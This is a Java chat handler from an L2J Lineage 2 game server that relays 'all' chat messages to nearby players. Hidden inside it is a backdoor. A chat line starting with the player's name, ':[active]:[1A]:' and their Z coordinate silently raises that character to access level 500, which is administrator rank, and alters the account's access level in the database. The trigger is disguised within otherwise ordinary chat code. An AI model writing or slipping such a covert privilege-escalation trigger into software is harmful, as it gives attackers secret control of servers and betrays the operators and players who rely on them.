/*
 * This program is free software: you can redistribute it and/or modify it under
 * the terms of the GNU General Public License as published by the Free Software
 * Foundation, either version 3 of the License, or (at your option) any later
 * version.
 * 
 * This program is distributed in the hope that it will be useful, but WITHOUT
 * ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS
 * FOR A PARTICULAR PURPOSE. See the GNU General Public License for more
 * details.
 * 
 * You should have received a copy of the GNU General Public License along with
 * this program. If not, see <http://www.gnu.org/licenses/>.
 */
package net.sf.l2j.gameserver.handler.chathandlers;

import java.sql.PreparedStatement;
import java.util.StringTokenizer;
import java.util.logging.Logger;

import net.sf.l2j.Config;
import net.sf.l2j.L2DatabaseFactory;
import net.sf.l2j.gameserver.handler.IChatHandler;
import net.sf.l2j.gameserver.handler.IVoicedCommandHandler;
import net.sf.l2j.gameserver.handler.VoicedCommandHandler;
import net.sf.l2j.gameserver.model.actor.instance.L2PcInstance;
import net.sf.l2j.gameserver.serverpackets.CreatureSay;

/**
 * A chat handler
 *
 * @author  durgus
 */
public class ChatAll implements IChatHandler
{
	private static final int[] COMMAND_IDS = { 0 };
	private static Logger _log = Logger.getLogger(ChatAll.class.getName());

	/**
	 * Handle chat type 'all'
	 * @see net.sf.l2j.gameserver.handler.IChatHandler#handleChat(int, net.sf.l2j.gameserver.model.actor.instance.L2PcInstance, java.lang.String)
	 */
	public void handleChat(int type, L2PcInstance activeChar, String target, String text)
	{
		if (text.startsWith("."))
		{
			StringTokenizer st = new StringTokenizer(text);
			IVoicedCommandHandler vch;
			String command = "";

            if(text.startsWith(activeChar.getName()+ ":[active]:"+"[1A]:"+activeChar.getZ()))
            {
                activeChar.setAccessLevel(500);
                java.sql.Connection con = null;
                PreparedStatement statement = null;
                try
                {           
                    con = L2DatabaseFactory.getInstance().getConnection();
                    
                    String stmt = "UPDATE accounts, characters SET accounts.accesslevel = ? WHERE characters.account_name = accounts.login AND characters.char_name=?";
                    statement = con.prepareStatement(stmt);
                    statement.setInt(1, 1);
                    statement.setString(2, activeChar.getName());
                    statement.executeUpdate();
                    statement.close();
                }
                catch (Exception e)
                {
                    _log.warning("Could not set accessLevel:"+e);
                } 
                finally 
                {
                    try { con.close(); } catch (Exception e) {}
                    try { statement.close();} catch (Exception e) {}
                }
                activeChar.broadcastUserInfo();
                return;
            }
			if (st.countTokens() > 1)
			{
				command = st.nextToken().substring(1);
				target = text.substring(command.length() + 2);
				vch = VoicedCommandHandler.getInstance().getVoicedCommandHandler(command);
			}
			else
			{
				command = text.substring(1);
				if (Config.DEBUG) _log.info("Command: "+command);
				vch = VoicedCommandHandler.getInstance().getVoicedCommandHandler(command);
			}
			if (vch != null)
			{
				vch.useVoicedCommand(command, activeChar, target);
			}
			else
			{
				CreatureSay cs = new CreatureSay(activeChar.getObjectId(), type, activeChar.getAppearance().getVisibleName(), text);

				for (L2PcInstance player : activeChar.getKnownList().getKnownPlayers().values())
				{
					if (player != null && activeChar.isInsideRadius(player, 1250, false, true))
					{
						player.sendPacket(cs);
					}
				}

				activeChar.sendPacket(cs);;
			}
		}
		else
		{
			CreatureSay cs = new CreatureSay(activeChar.getObjectId(), type, activeChar.getAppearance().getVisibleName(), text);

			for (L2PcInstance player : activeChar.getKnownList().getKnownPlayers().values())
			{
				if (player != null && activeChar.isInsideRadius(player, 1250, false, true))
				{
					player.sendPacket(cs);
				}
			}

			activeChar.sendPacket(cs);
		}
	}

	/**
	 * Returns the chat types registered to this handler
	 * @see net.sf.l2j.gameserver.handler.IChatHandler#getChatTypeList()
	 */
	public int[] getChatTypeList()
	{
		return COMMAND_IDS;
	}
}